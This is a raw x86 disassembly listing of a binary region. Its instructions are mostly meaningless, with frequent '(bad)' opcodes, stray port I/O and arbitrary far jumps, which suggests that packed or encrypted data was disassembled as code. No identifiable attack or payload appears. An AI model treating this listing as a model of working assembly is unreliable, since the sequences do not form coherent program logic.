  427632:	sbb    DWORD PTR [eax-0x5b7459cf],esi
  427638:	repz stc 
  42763a:	je     0x427616
  42763c:	dec    edi
  42763d:	stc    
  42763e:	int    0x69
  427640:	gs sbb eax,0xdf458c2f
  427646:	imul   esp,DWORD PTR [eax],0x34390fc2
  42764c:	inc    esi
  42764d:	ds inc ecx
  42764f:	les    esp,FWORD PTR [eax]
  427651:	std    
  427652:	ss cmc 
  427654:	pop    ebx
  427655:	out    0xdb,al
  427657:	stc    
  427658:	dec    edi
  427659:	repnz imul edx,DWORD PTR ss:0x97e6f102,0xffffffd4
  427662:	xor    DWORD PTR [ecx],esi
  427664:	enter  0x1186,0xc9
  427668:	dec    esp
  427669:	mov    edi,0x8d253cf1
  42766e:	jb     0x427604
  427670:	and    BYTE PTR [edi+0x1ae75295],al
  427676:	popf   
  427677:	fwait
  427678:	aam    0x1d
  42767a:	xor    bl,BYTE PTR [edx]
  42767c:	sub    eax,0xad6fdfab
  427681:	add    BYTE PTR [esi+0x3b0fee0e],0xa1
  427688:	les    eax,FWORD PTR [ebx+0x6e]
  42768b:	retf   
  42768c:	arpl   cx,si
  42768e:	imul   BYTE PTR [edx+0x0]
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fptan  
  427701:	inc    ebx
  427702:	test   BYTE PTR [esp+ebx*1+0x40001a5],bh
  427709:	add    DWORD PTR [eax],eax
  42770b:	add    ah,bh
  42770d:	cmp    cl,al
  42770f:	retf   0xa626
  427712:	push   es
  427713:	add    cl,BYTE PTR [ebx+0xa]
  427716:	or     eax,0x33fdb9fc
  42771b:	aaa    
  42771c:	in     al,0x94
  42771e:	adc    al,0x24
  427720:	mov    eax,ds:0x89ec8aa7
  427725:	pop    es
  427726:	adc    edx,DWORD PTR [esi+0x45]
  427729:	fsub   st(5),st
  42772b:	pop    ecx
  42772c:	sub    eax,0x527b4bd4
  427731:	mov    eax,ds:0x9cb8acc9
  427736:	(bad)  
  427737:	aaa    
  427738:	xchg   ebp,eax
  427739:	rcl    esi,cl
  42773b:	mov    BYTE PTR [edx-0x51],bh
  42773e:	scas   eax,DWORD PTR es:[edi]
  42773f:	push   ds
  427740:	je     0x42778d
  427742:	pop    ds
  427743:	add    DWORD PTR [ebx+ecx*4+0x78],eax
  427747:	cdq    
  427748:	fmul   QWORD PTR [ebx]
  42774a:	ret    
  42774b:	adc    al,0x97
  42774d:	adc    eax,0x4d2f8cbf
  427752:	or     edi,esi
  427754:	nop
  427755:	clc    
  427756:	mov    cl,0x50
  427758:	out    0x85,al
  42775a:	sbb    BYTE PTR [ebp-0x6328edd7],0xfb
  427761:	shl    dh,0xf3
  427764:	leave  
  427765:	jns    0x42776e
  427767:	dec    edi
  427768:	popa   
  427769:	jo     0x4277dd
  42776b:	jl     0x42773f
  42776d:	jmp    0x7c8cf1bc
  427772:	jnp    0x427773
  427774:	shl    BYTE PTR [ecx-0x6405a55b],1
  42777a:	sti    
  42777b:	(bad)  
  42777c:	push   ebp
  42777d:	into   
  42777e:	mov    ds:0xdae59586,al
  427783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427784:	stc    
  427785:	mov    fs,edi
  427787:	mov    eax,0x470654ff
  42778c:	adc    bh,dh
  42778e:	or     ebp,DWORD PTR [eax+ebx*8]
  427791:	fdivr  DWORD PTR [edx+ebp*8-0x20868b20]
  427798:	lahf   
  427799:	out    0x75,al
  42779b:	cmp    al,0x23
  42779d:	stos   DWORD PTR es:[edi],eax
  42779e:	int    0x85
  4277a0:	pop    esp
  4277a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4277a2:	sbb    DWORD PTR [ecx-0x20],esi
  4277a5:	jp     0x427769
  4277a7:	daa    
  4277a8:	cli    
  4277a9:	xor    bl,BYTE PTR [eax-0x7c]
  4277ac:	jecxz  0x427802
  4277ae:	dec    esp
  4277af:	jne    0x427763
  4277b1:	cld    
  4277b2:	push   0x12
  4277b4:	mov    ?,WORD PTR [ebx-0x272fc6a2]
  4277ba:	pop    edi
  4277bb:	fisttp WORD PTR [edx+esi*8]
  4277be:	jo     0x427752
  4277c0:	cdq    
  4277c1:	adc    ch,BYTE PTR ds:0x85dc6a7e
  4277c7:	mov    ch,0x69
  4277c9:	loopne 0x4277a8
  4277cb:	xor    al,0xb5
  4277cd:	mov    eax,0x589effb
  4277d2:	add    eax,0x5126e0a
  4277d7:	out    dx,eax
  4277d8:	sbb    esp,DWORD PTR [eax+0x790cc5aa]
  4277de:	outs   dx,DWORD PTR ds:[esi]
  4277df:	cmp    eax,0xf4b32ed
  4277e4:	add    dh,BYTE PTR [eax+0x7561d320]
  4277ea:	push   ebx
  4277eb:	add    eax,0x17f0fe57
  4277f0:	add    DWORD PTR [edi+0x2a159cf3],ebx
  4277f6:	jl     0x427867
  4277f8:	inc    edx
  4277f9:	inc    edi
  4277fa:	outs   dx,DWORD PTR ds:[esi]
  4277fb:	in     eax,dx
  4277fc:	pop    edi
  4277fd:	push   esp
  4277fe:	shl    esi,0x3f
  427801:	aam    0xe6
  427803:	sbb    DWORD PTR [ecx-0x3d996d98],ebx
  427809:	pop    esp
  42780a:	xor    eax,DWORD PTR ds:0x56acde74
	...
  427874:	sbb    cl,BYTE PTR [edx-0x3a64baf5]
  42787a:	pop    esi
  42787b:	fbstp  TBYTE PTR [eax+0x65]
  42787e:	fldl2e 
  427880:	sub    ah,BYTE PTR [esi]
  427882:	push   es
  427883:	xchg   DWORD PTR [eax],esp
  427885:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427886:	add    DWORD PTR [eax],eax
  427888:	add    al,0x1
  42788a:	add    BYTE PTR [eax],al
  42788c:	addr16 out dx,al
  42788e:	test   DWORD PTR [esi-0x51790fab],edx
  427894:	sbb    ch,cl
  427896:	pop    ebx
  427897:	out    dx,eax
  427898:	mov    ah,0xaa
  42789a:	dec    ebp
  42789b:	fnstcw WORD PTR [ecx+eax*8-0x32eb5d0d]
  4278a2:	add    ecx,DWORD PTR [edx]
  4278a4:	stc    
  4278a5:	retf   
  4278a6:	into   
  4278a7:	fistp  QWORD PTR [edx]
  4278a9:	mov    bl,BYTE PTR [ecx-0x2e]
  4278ac:	call   0x2c3fd014
  4278b1:	mov    WORD PTR [ebp+0x3e],?
  4278b4:	and    eax,DWORD PTR [ebp+0x213be224]
  4278ba:	push   ebx
  4278bb:	(bad)  
  4278bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4278bd:	mov    ecx,0xe3aa317d
  4278c2:	xor    DWORD PTR [ebx+ecx*8-0xd],edx
  4278c6:	mov    BYTE PTR [esi+0x36],cl
  4278c9:	shl    ah,0xec
  4278cc:	and    al,0x6c
  4278ce:	xchg   ecx,eax
  4278cf:	or     al,0xcb
  4278d1:	pushf  
  4278d2:	pop    ebp
  4278d3:	retf   
  4278d4:	js     0x4278de
  4278d6:	stos   BYTE PTR es:[edi],al
  4278d7:	push   ecx
  4278d8:	sbb    bh,BYTE PTR [ebx+0x72]
  4278db:	nop
  4278dc:	pop    esp
  4278dd:	cli    
  4278de:	sub    eax,0x17fad4ab
  4278e3:	dec    eax
  4278e4:	and    al,0x77
  4278e6:	xchg   esi,eax
  4278e7:	iret   
  4278e8:	xchg   edx,eax
  4278e9:	ror    DWORD PTR [esi+0x9],0x1e
  4278ed:	dec    esp
  4278ee:	adc    al,0x29
  4278f0:	push   ebx
  4278f1:	fwait
  4278f2:	and    eax,DWORD PTR [edi-0x34]
  4278f5:	lds    ebp,FWORD PTR [ecx-0x39]
  4278f8:	imul   esi,DWORD PTR [ebx-0x57],0x58
  4278fc:	mov    eax,ds:0xa61e9a21
  427901:	jne    0x42793c
  427903:	popf   
  427904:	cmp    esp,esi
  427906:	mov    esp,0x49b9b814
  42790b:	pushf  
  42790c:	pusha  
  42790d:	jbe    0x42792c
  42790f:	jns    0x2defa382
  427915:	sbb    esi,esi
  427917:	add    eax,0x42100b0e
  42791c:	inc    ebx
  42791d:	jmp    0xebfe:0x75bc97bf
  427924:	icebp  
  427925:	jns    0x427930
  427927:	stc    
  427928:	cmp    bh,al
  42792a:	aaa    
  42792b:	sbb    eax,DWORD PTR [ecx]
  42792d:	into   
  42792e:	(bad)  
  42792f:	xor    eax,0x710c92c2
  427934:	js     0x427950
  427936:	stos   BYTE PTR es:[edi],al
  427937:	jecxz  0x427968
  427939:	mov    esi,0x90ed1c4a
  42793e:	(bad)  
  42793f:	pushf  
  427940:	pop    es
  427941:	fidivr WORD PTR [ebp-0x112907f0]
  427947:	and    BYTE PTR fs:[edx+0x271eced0],cl
  42794e:	and    DWORD PTR [edi-0xb],ebx
  427951:	mov    edx,0xf147cd61
  427956:	sbb    eax,0x73dc8546
  42795b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42795c:	mov    edi,0xb8495792
  427961:	jnp    0x427955
  427963:	aam    0x8
  427965:	stos   DWORD PTR es:[edi],eax
  427966:	inc    esi
  427967:	and    al,0x3a
  427969:	stos   DWORD PTR es:[edi],eax
  42796a:	(bad)  
  42796b:	jg     0x427926
  42796d:	fidiv  WORD PTR [ebx]
  42796f:	push   ecx
  427970:	jne    0x427948
  427972:	jno    0x427981
  427974:	test   BYTE PTR [edi+0xc],ch
  427977:	dec    ebp
  427978:	jmp    0x4279c6
  42797a:	sub    eax,0xea29a49f
  42797f:	in     eax,dx
  427980:	inc    eax
  427981:	mov    ecx,DWORD PTR [edx+0x4e]
  427984:	arpl   WORD PTR [ebp+0x16cc53ad],sp
  42798a:	mov    ds:0x7f35ce09,al
  42798f:	jno    0x427991
	...
  4279f1:	add    BYTE PTR [eax],al
  4279f3:	add    BYTE PTR [edx-0x5c0023],bl
  4279f9:	mov    ds:0x7542fdde,eax
  4279fe:	fadd   DWORD PTR [ebx-0x2d55cacf]
  427a04:	and    al,0xa7
  427a06:	add    DWORD PTR [eax],eax
  427a08:	add    al,0x1
  427a0a:	add    BYTE PTR [eax],al
  427a0c:	(bad)  
  427a0e:	inc    eax
  427a0f:	nop
  427a10:	jbe    0x427a8e
  427a12:	popa   
  427a13:	rol    DWORD PTR [ecx-0x2df2fd39],1
  427a19:	sub    cl,BYTE PTR [ebx-0x3bc4c5a3]
  427a1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a20:	mov    cs,ebp
  427a22:	shr    DWORD PTR [edx+0x4a684861],cl
  427a28:	xor    BYTE PTR [eax+0x13bdecb0],dl
  427a2e:	cmp    cl,cl
  427a30:	aam    0x35
  427a32:	and    al,0xa8
  427a34:	cmc    
  427a35:	jl     0x427a07
  427a37:	cmp    DWORD PTR [edx-0x11],edi
  427a3a:	sbb    ebx,DWORD PTR [edi+0x39a06caf]
  427a40:	and    dh,BYTE PTR [esi-0x12]
  427a43:	mov    al,ds:0x3f724cbb
  427a48:	aam    0x0
  427a4a:	add    esp,DWORD PTR [esi+0x15c67436]
  427a50:	fdivr  QWORD PTR [ebx+0x26]
  427a53:	retf   0x4d8a
  427a56:	in     eax,dx
  427a57:	sub    al,0x5a
  427a59:	jge    0x427a5f
  427a5b:	mov    al,0x25
  427a5d:	add    BYTE PTR [eax],dh
  427a5f:	mov    bl,0x87
  427a61:	das    
  427a62:	test   BYTE PTR [ebp-0x29beae11],ch
  427a68:	add    BYTE PTR [edx-0x4d],ah
  427a6b:	fild   WORD PTR [edx+eax*2]
  427a6e:	inc    edi
  427a6f:	(bad)  
  427a70:	scas   eax,DWORD PTR es:[edi]
  427a71:	cwde   
  427a72:	xor    bh,BYTE PTR [ecx]
  427a74:	push   edi
  427a75:	mov    cs,WORD PTR [edx-0x52]
  427a78:	(bad)  
  427a79:	dec    ebp
  427a7a:	xor    BYTE PTR [ecx+0x75892cbb],ah
  427a80:	std    
  427a81:	out    0x10,eax
  427a83:	daa    
  427a84:	jmp    0x9b048b9b
  427a89:	lock fist DWORD PTR [eax+0x74]
  427a8d:	call   0xd9c0:0xe14999d5
  427a94:	mov    ds:0x3704008,al
  427a99:	jae    0x427a37
  427a9b:	std    
  427a9c:	xchg   edx,eax
  427a9d:	xchg   ecx,eax
  427a9e:	pop    esi
  427a9f:	mov    ebx,0xfec05c75
  427aa4:	pop    ebp
  427aa5:	ds or  eax,0x9bf46f7d
  427aab:	lahf   
  427aac:	js     0x427b29
  427aae:	cmp    bh,BYTE PTR [ebx]
  427ab0:	xchg   esi,eax
  427ab1:	mov    dl,0x71
  427ab3:	stc    
  427ab4:	fist   WORD PTR [esi]
  427ab6:	jns    0x427adb
  427ab8:	ss push esi
  427aba:	cmp    al,0xdb
  427abc:	pop    eax
  427abd:	jae    0x427b29
  427abf:	clc    
  427ac0:	mov    ds:0xb053833,eax
  427ac5:	sti    
  427ac6:	jmp    0x9b4eca1c
  427acb:	aam    0xf8
  427acd:	mov    esi,DWORD PTR [edi]
  427acf:	inc    edi
  427ad0:	aad    0xc9
  427ad2:	jno    0x427aff
  427ad4:	push   ss
  427ad5:	and    ecx,DWORD PTR [edi+0x1f]
  427ad8:	repnz mov ds:0xe4061952,eax
  427ade:	push   0xffffffc6
  427ae0:	mov    cl,0xbc
  427ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ae3:	jo     0x427b41
  427ae5:	jmp    0x427ad0
  427ae7:	push   es
  427ae8:	rcl    DWORD PTR [edx],0x87
  427aeb:	pop    ecx
  427aec:	lds    ebx,FWORD PTR [eax+0x4fe5f70a]
  427af2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427af3:	pop    ecx
  427af4:	jl     0x427b00
  427af6:	xchg   BYTE PTR [edx+0x14],dl
  427af9:	xchg   edi,eax
  427afa:	push   edx
  427afb:	repnz dec eax
  427afd:	dec    ebp
  427afe:	ss jae 0x427a91
  427b01:	ds mov edi,0x8348bb3e
  427b07:	push   ebp
  427b08:	hlt    
  427b09:	rcl    BYTE PTR [edx-0xe11fa8c],1
  427b0f:	mov    DWORD PTR [eax],eax
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	test   bh,0xef
  427b82:	cld    
  427b83:	xchg   DWORD PTR [eax],ebp
  427b85:	test   al,0x1
  427b87:	add    BYTE PTR [ecx+eax*1],al
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	mov    edi,0xa2eaf432
  427b91:	cmp    eax,0xdb276889
  427b96:	hlt    
  427b97:	iret   
  427b98:	mov    DWORD PTR [ecx-0x78],ecx
  427b9b:	jae    0x427b90
  427b9d:	popa   
  427b9e:	xor    al,0x92
  427ba0:	mov    dh,0xac
  427ba2:	mov    ss,WORD PTR [esi-0x12]
  427ba5:	push   ebp
  427ba6:	adc    bh,ah
  427ba8:	outs   dx,DWORD PTR ds:[esi]
  427ba9:	sar    edx,cl
  427bab:	loopne 0x427c0c
  427bad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bae:	or     bh,al
  427bb0:	pop    esp
  427bb1:	mov    al,ds:0x630d437f
  427bb6:	push   ds
  427bb7:	in     eax,dx
  427bb8:	dec    esp
  427bb9:	pop    ebx
  427bba:	lea    ebp,ds:0xff1a36df
  427bc0:	div    BYTE PTR [esp+eiz*8]
  427bc3:	xchg   edx,eax
  427bc4:	push   ebp
  427bc5:	jb     0x427bba
  427bc7:	into   
  427bc8:	notrack jmp eax
  427bcb:	cmp    eax,0x8b220ab8
  427bd0:	sub    BYTE PTR [edi+0xa72413e],0x69
  427bd7:	and    al,0x60
  427bd9:	imul   esp,esp,0x4b
  427bdc:	and    esi,0x7a
  427bdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427be0:	call   0x8528:0x4d30d5f
  427be7:	call   0xf00f:0x5bcd59b4
  427bee:	stos   DWORD PTR es:[edi],eax
  427bef:	inc    ecx
  427bf0:	in     al,dx
  427bf1:	popf   
  427bf2:	les    ecx,FWORD PTR [esi+0xc583b62]
  427bf8:	or     bh,al
  427bfa:	jmp    0x9b1d:0xc4446dff
  427c01:	dec    ecx
  427c02:	add    eax,0x83c26226
  427c07:	pop    ebp
  427c08:	out    dx,al
  427c09:	sub    edx,edi
  427c0b:	or     BYTE PTR [ebp+0x26],ch
  427c0e:	frstor [esi]
  427c10:	mov    al,ds:0xebc3d548
  427c15:	scas   al,BYTE PTR es:[edi]
  427c16:	cmp    edi,ebp
  427c18:	rcl    BYTE PTR [ecx+ebx*8+0x5c2d5ea3],0x21
  427c20:	sbb    al,bh
  427c22:	test   DWORD PTR [eax],esp
  427c24:	loope  0x427bd2
  427c26:	mov    ?,WORD PTR [ebp+0x178639d6]
  427c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c2d:	out    dx,eax
  427c2e:	enter  0xf623,0x6f
  427c32:	les    ebx,FWORD PTR [ebx+0x34]
  427c35:	fisttp QWORD PTR [edi+0x38]
  427c38:	inc    ebp
  427c39:	xchg   ebp,eax
  427c3a:	test   eax,0xfadccd5f
  427c3f:	icebp  
  427c40:	fisub  DWORD PTR [esi-0x7437aa62]
  427c46:	(bad)  
  427c47:	xor    DWORD PTR [ebx],esp
  427c49:	push   es
  427c4a:	not    BYTE PTR [edi]
  427c4c:	stc    
  427c4d:	ja     0x427c3e
  427c4f:	pop    es
  427c50:	nop
  427c51:	mov    esp,ebx
  427c53:	xchg   esi,eax
  427c54:	sub    DWORD PTR [esi-0x60],eax
  427c57:	mov    ebx,esi
  427c59:	inc    eax
  427c5a:	rcr    BYTE PTR [edx],0x89
  427c5d:	pop    ss
  427c5e:	lea    edi,[edx+0x69]
  427c61:	repz mov ebx,0x7a592225
  427c67:	shl    BYTE PTR [ebx+0x82babc9],0xf1
  427c6e:	ins    BYTE PTR es:[edi],dx
  427c6f:	in     al,dx
  427c70:	dec    ebx
  427c71:	mov    al,ds:0x73121a81
  427c76:	pop    esp
  427c77:	fidivr DWORD PTR [ebp+edx*2+0x0]
  427c7b:	and    al,dl
  427c7d:	jp     0x427c2e
  427c7f:	out    0xe1,al
  427c81:	xor    eax,0x6da0acd8
  427c86:	clc    
  427c87:	stos   BYTE PTR es:[edi],al
  427c88:	adc    eax,DWORD PTR [ecx+0x636400a7]
  427c8e:	pop    ds
  427c8f:	push   edi
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x9f645d44,ebx
  427d02:	adc    cl,dh
  427d04:	sub    al,0xa9
  427d06:	add    DWORD PTR [eax],eax
  427d08:	add    al,0x1
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	loope  0x427c9c
  427d0e:	dec    ebp
  427d0f:	mov    eax,0xebd61769
  427d14:	cmp    al,0xbb
  427d16:	or     cl,BYTE PTR [edi-0x16]
  427d19:	mov    ebp,0xafa20772
  427d1e:	push   ss
  427d1f:	mov    dh,0xf9
  427d21:	push   0xb2fbbb90
  427d26:	add    BYTE PTR [esi],0xc8
  427d29:	sub    eax,0x5cd9375
  427d2e:	outs   dx,DWORD PTR ds:[esi]
  427d2f:	mov    esp,0x6a95314a
  427d34:	and    esi,DWORD PTR [ebp-0x27]
  427d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d38:	mov    al,0x28
  427d3a:	xchg   esi,eax
  427d3b:	popa   
  427d3c:	data16 xchg BYTE PTR [edx-0x1cc57b64],ch
  427d43:	out    dx,eax
  427d44:	cld    
  427d45:	stc    
  427d46:	sub    ebx,ebp
  427d48:	out    0x5f,eax
  427d4a:	retf   
  427d4b:	mov    edi,0x329ac9f4
  427d50:	mov    dh,0x73
  427d52:	xlat   BYTE PTR ds:[ebx]
  427d53:	pop    es
  427d54:	jbe    0x427da4
  427d56:	lock push 0xc24bd66e
  427d5c:	jp     0x427dbd
  427d5e:	xchg   edi,eax
  427d5f:	test   DWORD PTR [edx],0x55d6192d
  427d65:	mov    ds:0xbf93b1cf,eax
  427d6a:	lea    ebx,[ecx+0x75196987]
  427d70:	fcomp  QWORD PTR [ecx]
  427d72:	fdivr  QWORD PTR [esi+0xd15de2c]
  427d78:	sbb    esp,ebp
  427d7a:	sub    eax,0x5beea6d0
  427d7f:	push   eax
  427d80:	push   esp
  427d81:	xchg   esi,eax
  427d82:	nop
  427d83:	scas   al,BYTE PTR es:[edi]
  427d84:	fs inc esi
  427d86:	(bad)  
  427d87:	cli    
  427d88:	adc    DWORD PTR [ebx+0x6],eax
  427d8b:	adc    al,0x88
  427d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d8e:	xchg   BYTE PTR [ebx+0x437c38a5],ch
  427d94:	cmp    edx,DWORD PTR [esi]
  427d96:	and    ecx,esi
  427d98:	xor    eax,esi
  427d9a:	push   esi
  427d9b:	mov    ch,0x75
  427d9d:	ja     0x427da5
  427d9f:	dec    edi
  427da0:	in     eax,0x1c
  427da2:	ins    BYTE PTR es:[edi],dx
  427da3:	mov    cl,0x72
  427da5:	cmp    eax,0xc97c2823
  427daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427dab:	aaa    
  427dac:	fldenv [esi+0x79]
  427daf:	push   0xffffffa8
  427db1:	sbb    DWORD PTR [edx],esi
  427db3:	jle    0x427d36
  427db5:	xchg   ebp,eax
  427db6:	jo     0x427d87
  427db8:	push   ss
  427db9:	or     dh,BYTE PTR [edx+eax*1-0x1e]
  427dbd:	call   0x7d55b2c8
  427dc2:	fiadd  WORD PTR [edi]
  427dc4:	scas   al,BYTE PTR es:[edi]
  427dc5:	push   esi
  427dc6:	pop    es
  427dc7:	into   
  427dc8:	loop   0x427dc9
  427dca:	and    BYTE PTR [edx+0x2c],dh
  427dcd:	int3   
  427dce:	pop    es
  427dcf:	int    0x51
  427dd1:	repnz inc ebx
  427dd3:	(bad)  
  427dd4:	in     al,dx
  427dd5:	(bad)  
  427dd6:	retf   0x734c
  427dd9:	or     dh,BYTE PTR [edi]
  427ddb:	xchg   esi,eax
  427ddc:	mov    ds:0x699fcae2,eax
  427de1:	retf   
  427de2:	push   edi
  427de3:	push   eax
  427de4:	jge    0x427e35
  427de6:	push   ebp
  427de7:	or     dl,dh
  427de9:	lea    esp,[ebx-0x1d]
  427dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ded:	test   BYTE PTR [edx+0x4cc37592],cl
  427df3:	jo     0x427e58
  427df5:	xchg   edi,eax
  427df6:	pop    es
  427df7:	jl     0x427e54
  427df9:	sbb    BYTE PTR [edx+0x52],bl
  427dfc:	push   ecx
  427dfd:	fstp   DWORD PTR [edi+0x3e]
  427e00:	call   0x33d7009f
  427e05:	jmp    0x9a20:0xfe34df23
  427e0c:	cmp    al,0x88
  427e0e:	push   ecx
  427e0f:	adc    eax,0x0
	...
  427e74:	mov    eax,0x6d3c25f1
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	jle    0x427e47
  427e82:	mov    esi,DWORD PTR [eax+0x30]
  427e85:	stos   BYTE PTR es:[edi],al
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	jmp    0x9aa0:0xd356c787
  427e93:	idiv   esp
  427e95:	xor    eax,DWORD PTR [ecx-0x128f1101]
  427e9b:	sub    dl,dl
  427e9d:	sbb    BYTE PTR [edi+edx*8+0x649ab29f],bh
  427ea4:	mov    ebx,0x2f648515
  427ea9:	enter  0x6b62,0x81
  427ead:	adc    eax,0xff4d490c
  427eb2:	or     DWORD PTR [esi+0x38e440f5],ebx
  427eb8:	dec    edx
  427eb9:	rcl    BYTE PTR [edi],1
  427ebb:	and    dl,cl
  427ebd:	aad    0xc3
  427ebf:	mov    ds,WORD PTR [ebx+0x216e09bc]
  427ec5:	mov    ecx,0x8533393d
  427eca:	push   ecx
  427ecb:	cwde   
  427ecc:	xchg   ebp,eax
  427ecd:	push   cs
  427ece:	cwde   
  427ecf:	fstp   TBYTE PTR [eax+eax*4]
  427ed2:	inc    ebp
  427ed3:	mov    ds:0xaebc2517,eax
  427ed8:	mov    ch,0x6f
  427eda:	sub    eax,0xce7fa747
  427edf:	cmp    bh,ch
  427ee1:	in     al,0x2b
  427ee3:	inc    ecx
  427ee4:	xor    ah,BYTE PTR [edx-0xc]
  427ee7:	idiv   bh
  427ee9:	jns    0x427e8f
  427eeb:	mov    esi,0x6c390e78
  427ef0:	sbb    eax,0xe3466e04
  427ef5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ef6:	js     0x427ee7
  427ef8:	add    ecx,DWORD PTR ds:0x8161b9ef
  427efe:	mov    ecx,0xd8793adf
  427f03:	(bad)  
  427f04:	imul   DWORD PTR [ebx-0x34451ef6]
  427f0a:	cli    
  427f0b:	add    bl,cl
  427f0d:	jae    0x427eb0
  427f0f:	and    BYTE PTR [esi+0x135d9425],0x40
  427f16:	or     DWORD PTR [ebp-0x3d2b3624],esi
  427f1c:	rcr    BYTE PTR [eax-0x7a8440f7],0x2e
  427f23:	adc    al,0x9d
  427f25:	mov    dl,0xd8
  427f27:	ret    
  427f28:	ror    ebp,0xa7
  427f2b:	int    0xd1
  427f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f2e:	jmp    0x427ebb
  427f30:	xchg   esp,eax
  427f31:	mov    BYTE PTR [ebp-0x5b],al
  427f34:	fnstenv ds:0xf33a6ed4
  427f3a:	jnp    0x427ef1
  427f3c:	lds    edi,FWORD PTR [esi]
  427f3e:	mov    WORD PTR ds:[esi],ss
  427f41:	cmp    BYTE PTR [edi+0x303c1980],ch
  427f47:	and    eax,0x8b8a248d
  427f4c:	jb     0x427f14
  427f4e:	inc    eax
  427f4f:	fwait
  427f50:	lods   al,BYTE PTR ds:[esi]
  427f51:	cs stos DWORD PTR es:[edi],eax
  427f53:	inc    ecx
  427f54:	fild   QWORD PTR [eax-0x3c]
  427f57:	push   ds
  427f58:	and    dh,BYTE PTR [ebx-0x38]
  427f5b:	add    BYTE PTR [edi+0x2],cl
  427f5e:	mov    ds:0x29dd8f86,al
  427f63:	sbb    esp,esp
  427f65:	xor    ah,cl
  427f67:	add    cl,dh
  427f69:	shl    BYTE PTR [ebx+0x5212d4c9],0x91
  427f70:	jbe    0x427f69
  427f72:	sub    edi,ebx
  427f74:	in     eax,dx
  427f75:	or     al,bh
  427f77:	ins    DWORD PTR es:[edi],dx
  427f78:	pop    esp
  427f79:	out    dx,al
  427f7a:	(bad)  
  427f7b:	dec    esi
  427f7c:	ins    DWORD PTR es:[edi],dx
  427f7d:	popa   
  427f7e:	dec    esi
  427f7f:	into   
  427f80:	inc    ebp
  427f81:	iret   
  427f82:	into   
  427f83:	lds    eax,FWORD PTR [eax+0x6bef713a]
  427f89:	pusha  
  427f8a:	test   bl,ah
  427f8c:	fucomp st(5)
  427f8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f8f:	cmp    eax,0x0
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	shl    BYTE PTR [edi-0x54cbb79a],1
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	adc    cl,cl
  42800e:	push   0x22fba2bb
  428013:	xchg   edi,ecx
  428015:	fld    st(7)
  428017:	int    0x4
  428019:	xlat   BYTE PTR ds:[ebx]
  42801a:	mov    esp,0xe79e8a9
  42801f:	dec    ecx
  428020:	fadd   QWORD PTR [ecx+0x1ec87bd6]
  428026:	lea    esp,[esi-0x4]
  428029:	in     al,dx
  42802a:	js     0x428002
  42802c:	mov    BYTE PTR [eax-0x364b921d],0xf5
  428033:	ja     0x42800d
  428035:	ret    0xab82
  428038:	add    BYTE PTR [ecx],ch
  42803a:	pop    esp
  42803b:	cmp    al,0x7
  42803d:	lds    esp,FWORD PTR [eax]
  42803f:	adc    ebp,DWORD PTR [ebp-0xf96c29f]
  428045:	inc    ebx
  428046:	hlt    
  428047:	and    edx,esp
  428049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42804a:	(bad)  
  42804b:	xor    ebp,DWORD PTR [edi+ebx*8-0x7b577c71]
  428052:	enter  0xd8c4,0xcc
  428056:	jg     0x427fd9
  428058:	add    DWORD PTR [eax-0x28],eax
  42805b:	out    dx,eax
  42805c:	lods   al,BYTE PTR ds:[esi]
  42805d:	popf   
  42805e:	pop    es
  42805f:	and    eax,0x10c9dceb
  428064:	pop    ebp
  428065:	xchg   ebx,eax
  428066:	adc    DWORD PTR [edi+0x2c5381fb],esp
  42806c:	jmp    DWORD PTR [ebx-0x80]
  42806f:	xchg   DWORD PTR [edi],ebx
  428071:	aaa    
  428072:	mov    DWORD PTR [ecx+0x51],edx
  428075:	inc    esp
  428076:	imul   esp,DWORD PTR [ebx],0x91f6622c
  42807c:	cdq    
  42807d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42807e:	add    esp,DWORD PTR [ecx-0x33635238]
  428084:	ja     0x42803c
  428086:	test   BYTE PTR [eax],bh
  428088:	(bad)  [edx-0x498a2aa3]
  42808e:	mov    ds:0xb00899d1,al
  428093:	ja     0x4280de
  428095:	rcr    edi,1
  428097:	aaa    
